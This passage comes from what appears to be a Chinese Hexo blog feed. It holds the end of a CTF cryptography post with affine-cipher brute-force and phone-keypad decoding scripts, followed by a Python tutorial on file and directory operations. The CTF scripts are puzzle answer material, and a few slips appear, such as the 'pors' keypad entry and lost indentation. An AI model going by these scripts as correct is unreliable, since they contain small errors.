class="number">26</span></span><br><span class="line">    s1+=chr(a+<span class="number">97</span>)</span><br><span class="line">print(base64.b64encode(s1))</span><br><span class="line"><span class="comment"># a=(a的逆元*(ord(s[i])-97-b))%26</span></span><br></pre></td></tr></table></figure><p>暴力破解脚本(a未知)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;achjbnpdfherebjsw&#x27;</span></span><br><span class="line">b=[<span class="number">1</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">25</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">a=(j*(ord(str1[i])<span class="number">-97</span><span class="number">-7</span>))%<span class="number">26</span></span><br><span class="line">flag+=chr(a+<span class="number">97</span>)</span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>暴力破解脚本(a、b均未知)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&#x27;SElWTVVSQ1FXUUlXVUhFVg==&#x27;</span></span><br><span class="line">plain1 = base64.b64decode(cipher)</span><br><span class="line"></span><br><span class="line">dict = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">plain2 = plain1.lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dict:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        plain3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> plain2:</span><br><span class="line">            plain3 += chr((a*(ord(item)<span class="number">-97</span>)+b)%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">print</span> plain3</span><br></pre></td></tr></table></figure><h2 id="手机密码"><a href="#手机密码" class="headerlink" title="手机密码"></a>手机密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strr = <span class="string">&quot;ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee&quot;</span>.split()</span><br><span class="line">all = &#123;<span class="string">&#x27;none1&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;none2&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;ghi&#x27;</span>,<span class="string">&#x27;t&#x27;</span>:<span class="string">&#x27;jkl&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;mno&#x27;</span>,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;pors&#x27;</span>,<span class="string">&#x27;i&#x27;</span>:<span class="string">&#x27;tuv&#x27;</span>,<span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;wxyz&#x27;</span>&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">    flag+=all[i[<span class="number">0</span>]][len(i)<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--Python文件操作</title>
      <link href="2018/12/02/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>2018/12/02/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h3 id="Python文件操作"><a href="#Python文件操作" class="headerlink" title="Python文件操作"></a>Python文件操作</h3><h4 id="Python中文件数据的读和写"><a href="#Python中文件数据的读和写" class="headerlink" title="Python中文件数据的读和写"></a>Python中文件数据的读和写</h4><h5 id="open-方法"><a href="#open-方法" class="headerlink" title="open()方法"></a>open()方法</h5><h6 id="两个参数"><a href="#两个参数" class="headerlink" title="两个参数"></a>两个参数</h6><p>mode(模式)和encoding(编码)。</p><ul><li><p>encoding一般来说，打开文件的编码方式以操作系统的默认编码为准，中文可能会出现乱码，需要加encoding=’utf-8’，windows默认gbk，linux默认utf-8，mac默认utf-8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;utf-8&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.readlines()</span><br><span class="line">    print(a)</span><br></pre></td></tr></table></figure></li><li><p>mode，它指定文件打开的模式，对于非文本文件，我们只能使用b模式。注：以b方式打开时，读取到的内容是字节类型，写入时也需要提供字节类型，不能指定编码。</p><p>关于r+模式：打开一个文件用于读写，文件指针默认将会放在文件的开头。注意：如果在读写模式下，先写后读，那么文件就会出问题，因为默认光标是在文件的最开始，你要是先写，则写入的内容会将原内容覆盖掉，直到覆盖到你写完的内容，然后在从后面开始读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  &#39;r&#39;： 以只读模式打开（缺省模式，必须保证文件存在）</span><br><span class="line">  &#39;w&#39;：以只写模式打开。若文件存在，则清空文件，然后重新创建；若不存在，则新建</span><br><span class="line">  &#39;a&#39;：以追加模式打开。若文件存在，则会追加到文件的末尾；若文件不存在，则新建</span><br><span class="line">  </span><br><span class="line">  常见的mode组合</span><br><span class="line">  &#39;r&#39;或&#39;rt&#39;：   默认模式，文本读模式</span><br><span class="line">  &#39;w&#39;或&#39;wt&#39;：以文本写模式打开（打开前文件被清空）</span><br><span class="line">  &#39;rb&#39;：       以二进制读模式打开</span><br><span class="line">  &#39;ab&#39;：      以二进制追加模式打开</span><br><span class="line">  &#39;wb&#39;：      以二进制写模式打开（打开前文件被清空）</span><br><span class="line">  &#39;r+&#39;：       以文本读写模式打开，默认写的指针开始指在文件开头, 因此会覆写文件</span><br><span class="line">  &#39;w+&#39;：      以文本读写模式打开（打开前文件被清空）</span><br><span class="line">  &#39;a+&#39;：      以文本读写模式打开（只能写在文件末尾）</span><br><span class="line">  &#39;rb+&#39;：     以二进制读写模式打开</span><br><span class="line">  &#39;wb+&#39;：   以二进制读写模式打开（打开前被清空）</span><br><span class="line">&#39;ab+&#39;：    以二进制读写模式打开</span><br></pre></td></tr></table></figure></li></ul><h6 id="with-open"><a href="#with-open" class="headerlink" title="with open()"></a>with open()</h6><p>优点</p><p>优点1：不用手动关闭文件句柄。</p><p>优点2：一个语句可以操作多个文件句柄。</p><h6 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h6><p><code>tell() </code>方法用来显示当前指针的位置。</p><p><code>seek(offset,whence)</code>方法用来重新设定指针的位置。</p><ul><li>offset:表示偏移量</li></ul><ul><li>whence:只能传入012中的一个数字。 </li></ul><ul><li><ul><li>0表示从文件头开始</li></ul></li></ul><ul><li>1表示从当前位置开始</li></ul><ul><li>2 表示从文件的末尾开始</li></ul><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;data.txt&#39;, &#39;r&#39;) as f:</span><br><span class="line">    data &#x3D; f.read()</span><br><span class="line">    print(&#39;context: &#123;&#125;&#39;.format(data))</span><br></pre></td></tr></table></figure><ul><li><p>file.read([size])<br>从文件读取指定的字节数，如果未给定或为负则读取所有。</p></li><li><p>file.readline([size])<br>读取整行，包括 “\n” 字符，readline()读取第一行就返回，再次调用f.readline()，会读取下一行。</p></li><li><p>file.readlines([sizeint])</p><p>常与for循环和strip()去掉换行符配合。</p><p>读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">47</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     print(f.read())</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line">python <span class="keyword">is</span> a cat.</span><br><span class="line">this <span class="keyword">is</span> the end.</span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     print(f.readlines())</span><br><span class="line">[<span class="string">&#x27;1 is everything.\n&#x27;</span>, <span class="string">&#x27;python is a cat.\n&#x27;</span>, <span class="string">&#x27;this is the end.&#x27;</span>]</span><br><span class="line">In [<span class="number">49</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     print(f.readline())</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line">In [<span class="number">61</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    ...:         print(line)</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line"></span><br><span class="line">python <span class="keyword">is</span> a cat.</span><br><span class="line"></span><br><span class="line">this <span class="keyword">is</span> the end.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取内容包含换行符，所以要strip()去掉换行符</span></span><br><span class="line">In [<span class="number">62</span>]: <span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    ...:         print(line.strip())</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> everything.</span><br><span class="line">python <span class="keyword">is</span> a cat.</span><br><span class="line">this <span class="keyword">is</span> the end.</span><br></pre></td></tr></table></figure><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;data.txt&#39;, &#39;w&#39;) as f:</span><br><span class="line">    data &#x3D; &#39;some data to be written to the file&#39;</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure><h4 id="获取目录列表"><a href="#获取目录列表" class="headerlink" title="获取目录列表"></a>获取目录列表</h4><h5 id="os-scandir"><a href="#os-scandir" class="headerlink" title="os.scandir()"></a>os.scandir()</h5><p><code>os.scandir()</code> 调用时返回一个迭代器而不是一个列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">entries &#x3D; os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">print(entries)</span><br><span class="line"># &lt;posix.ScandirIterator at 0x105b4d4b0&gt;</span><br></pre></td></tr></table></figure><p>ScandirIterator 指向了当前目录中的所有条目。你可以遍历迭代器的内容，并打印文件名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">with os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        print(entry.name)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">.DS_Store</span><br><span class="line">阅读笔记.md</span><br><span class="line">.localized</span><br><span class="line">常用操作</span><br><span class="line">huazhu.com.csv</span><br><span class="line">huazhu_url.txt</span><br><span class="line">code</span><br><span class="line">steady-learn</span><br><span class="line">vulhub-master</span><br><span class="line">未命名 2.txt</span><br><span class="line">PHP木马.md</span><br><span class="line">java基础.md</span><br><span class="line">1.py</span><br><span class="line">makedown</span><br><span class="line">SQL server.md</span><br><span class="line">开发学习</span><br><span class="line">sqlmap使用以及学习.md</span><br><span class="line">SQL注入漏洞挖掘.md</span><br><span class="line">IPC.md</span><br><span class="line">Python爬虫.md</span><br><span class="line">漏洞盒子</span><br></pre></td></tr></table></figure><p>这里 <code>os.scandir()</code> 和with语句一起使用，因为它支持上下文管理协议。使用上下文管理器关闭迭代器并在迭代器耗尽后自动释放获取的资源。</p><h5 id="pathlib"><a href="#pathlib" class="headerlink" title="pathlib"></a>pathlib</h5><p>获取目录列表的方法是使用 <code>pathlib</code> 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">entries &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">for entry in entries.iterdir():</span><br><span class="line">    print(entry.name)</span><br></pre></td></tr></table></figure><p><code>pathlib.Path()</code> 返回的是 <code>PosixPath</code> 或 <code>WindowsPath</code> 对象，这取决于操作系统。</p><p><code>pathlib.Path()</code> 对象有一个 <code>.iterdir()</code> 的方法用于创建一个迭代器包含该目录下所有文件和目录。由 <code>.iterdir()</code> 生成的每个条目都包含文件或目录的信息，例如其名称和文件属性。<code>pathlib</code> 在Python3.4时被第一次引入，并且是对Python一个很好的加强，它为文件系统提供了面向对象的接口。</p><p>在上面的例子中，你调用 <code>pathlib.Path()</code> 并传入了一个路径参数。然后调用 <code>.iterdir()</code> 来获取 <code>my_directory</code> 下的所有文件和目录列表。</p><p>总结</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>os.listdir()</td><td>以列表的方式返回目录中所有的文件和文件夹</td></tr><tr><td>os.scandir()</td><td>返回一个迭代器包含目录中所有的对象，对象包含文件属性信息</td></tr><tr><td>pathlib.Path().iterdir()</td><td>返回一个迭代器包含目录中所有的对象，对象包含文件属性信息</td></tr></tbody></table><h4 id="获取目录中的文件"><a href="#获取目录中的文件" class="headerlink" title="获取目录中的文件"></a>获取目录中的文件</h4><p>打印出目录中文件的名称。为了过滤目录并仅列出 <code>os.listdir()</code> 生成的目录列表的文件，要使用 <code>os.path</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">for entry in os.listdir(basepath):</span><br><span class="line">    # 使用os.path.isfile判断该路径是否是文件类型</span><br><span class="line">    if os.path.isfile(os.path.join(basepath, entry)):</span><br><span class="line">        print(entry)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">.DS_Store</span><br><span class="line">阅读笔记.md</span><br><span class="line">.localized</span><br><span class="line">huazhu.com.csv</span><br><span class="line">huazhu_url.txt</span><br><span class="line">未命名 2.txt</span><br><span class="line">PHP木马.md</span><br><span class="line">java基础.md</span><br><span class="line">1.py</span><br><span class="line">SQL server.md</span><br><span class="line">sqlmap使用以及学习.md</span><br><span class="line">SQL注入漏洞挖掘.md</span><br><span class="line">IPC.md</span><br><span class="line">Python爬虫.md</span><br></pre></td></tr></table></figure><p>在这里调用 <code>os.listdir()</code> 返回指定路径中所有内容的列表，接着使用 <code>os.path.isfile()</code> 过滤列表让其只显示文件类型而非目录类型。</p><p>一个更简单的方式来列出一个目录中所有的文件是使用 <code>os.scandir()</code> 或 <code>pathlib.Path()</code> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">with os.scandir(basepath) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        if entry.is_file():</span><br><span class="line">            print(entry.name)</span><br></pre></td></tr></table></figure><p><code>pathlib.Path()</code> 列出一个目录中的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">basepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">for entry in basepath.iterdir():</span><br><span class="line">    if entry.is_file():</span><br><span class="line">        print(entry.name)</span><br></pre></td></tr></table></figure><h4 id="列出子目录"><a href="#列出子目录" class="headerlink" title="列出子目录"></a>列出子目录</h4><p><code>os.listdir()</code> 和 <code>os.path()</code> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">for entry in os.listdir(basepath):</span><br><span class="line">    if os.path.isdir(os.path.join(basepath, entry)):</span><br><span class="line">        print(entry)</span><br></pre></td></tr></table></figure><p><code>os.scandir()</code> ：</p><p><code>is_dir()</code> 返回 True，否侧返回False</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">basepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;</span><br><span class="line">with os.scandir(basepath) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        if entry.is_dir():</span><br><span class="line">            print(entry.name)</span><br></pre></td></tr></table></figure><p><code>pathlib.Path()</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">basepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)</span><br><span class="line">for entry in basepath.iterdir():</span><br><span class="line">    if entry.is_dir():</span><br><span class="line">        print(entry.name)</span><br></pre></td></tr></table></figure><p>在 <code>.iterdir()</code> 迭代器返回的每一项上调用 <code>is_dir()</code> 检查是文件还是目录。</p><h4 id="获取文件属性"><a href="#获取文件属性" class="headerlink" title="获取文件属性"></a>获取文件属性</h4><p><code>os.scandir()</code> 和 <code>pathlib.Path()</code> 能直接获取到包含文件属性的目录列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">with os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries:</span><br><span class="line">    for entry in entries:</span><br><span class="line">        info &#x3D; entry.stat()</span><br><span class="line">        print(info.st_mtime)       </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">1548163662.3952665</span><br><span class="line">1548163689.1982062</span><br><span class="line">1548163697.9175904</span><br><span class="line">1548163721.1841028</span><br><span class="line">1548163740.765162</span><br><span class="line">1548163769.4702623</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><code>os.scandir()</code> 返回一个 <code>ScandirIterator</code> 对象。<code>ScandirIterator</code> 对象中的每一项有 <code>.stat()</code> 方法能获取关于它指向文件或目录的信息。</p><p><code>.stat()</code> 提供了例如文件大小和最后修改时间的信息。</p><h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>os.mkdir()</td><td>创建单个子目录</td></tr><tr><td>os.makedirs()</td><td>创建多个目录，包括中间目录</td></tr><tr><td>Pathlib.Path.mkdir()</td><td>创建单个或多个目录</td></tr></tbody></table><h5 id="创建单个目录"><a href="#创建单个目录" class="headerlink" title="创建单个目录"></a>创建单个目录</h5><p>要创建单个目录，把目录路径作为参数传给 <code>os.mkdir()</code> :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&#x27;/steady/1.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果该目录已经存在，<code>os.mkdir()</code> 将抛出 <code>FileExistsError</code> 异常。或者，你也可以使用 <code>pathlib</code> 来创建目录:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">p = Path(<span class="string">&#x27;example_directory&#x27;</span>)</span><br><span class="line">p.mkdir()</span><br></pre></td></tr></table></figure><p>如果路径已经存在，<code>mkdir()</code> 会抛出 <code>FileExistsError</code> 异常:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileExistsError: [Errno 17] File exists: &#39;example_directory&#39;</span><br></pre></td></tr></table></figure><p>为了避免像这样的错误抛出， 当发生错误时捕获错误并让你的用户知道:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">p = Path(<span class="string">&#x27;example_directory&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p.mkdir()</span><br><span class="line"><span class="keyword">except</span> FileExistsError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><h5 id="创建多个目录"><a href="#创建多个目录" class="headerlink" title="创建多个目录"></a>创建多个目录</h5><p>os.makedirs() 和 os.mkdir() 类似。两者之间的区别在于，os.makedirs() 不仅可以创建单独的目录，还可以递归的创建目录树。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&#x27;2018/10/05&#x27;</span>, mode=<span class="number">0o770</span>)</span><br></pre></td></tr></table></figure><p>上述代码创建了 <code>2018/10/05</code> 的目录结构并为所有者和组用户提供读、写和执行权限。默认的模式为 <code>0o777</code> ，增加了其他用户组的权限。</p><h4 id="遍历目录和处理文件"><a href="#遍历目录和处理文件" class="headerlink" title="遍历目录和处理文件"></a>遍历目录和处理文件</h4><p>Python函数 <code>os.walk()</code> 来实现这一功能。<code>os.walk()</code> 用于通过从上到下或从下到上遍历树来生成目录树中的文件名。</p><p><code>os.walk()</code> 默认是从上到下遍历目录:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirpath, dirname, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;目录位置&#x27;</span>):</span><br><span class="line">   print(<span class="string">f&#x27;Found directory: <span class="subst">&#123;dirpath&#125;</span>&#x27;</span>)</span><br><span class="line">   <span class="keyword">for</span> file_name <span class="keyword">in</span> files:</span><br><span class="line">       print(file_name)</span><br></pre></td></tr></table></figure><p><code>os.walk()</code> 在每个循环中返回三个值：</p><ol><li>当前文件夹的名称</li><li>当前文件夹中子文件夹的列表</li><li>当前文件夹中文件的列表</li></ol><p>在每次迭代中，会打印出它找到的子目录和文件的名称：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Found directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入题</span><br><span class="line">.DS_Store</span><br><span class="line">SQL注入-<span class="number">-8.</span>md</span><br><span class="line">SQL注入-<span class="number">-3.</span>md</span><br><span class="line">SQL注入-<span 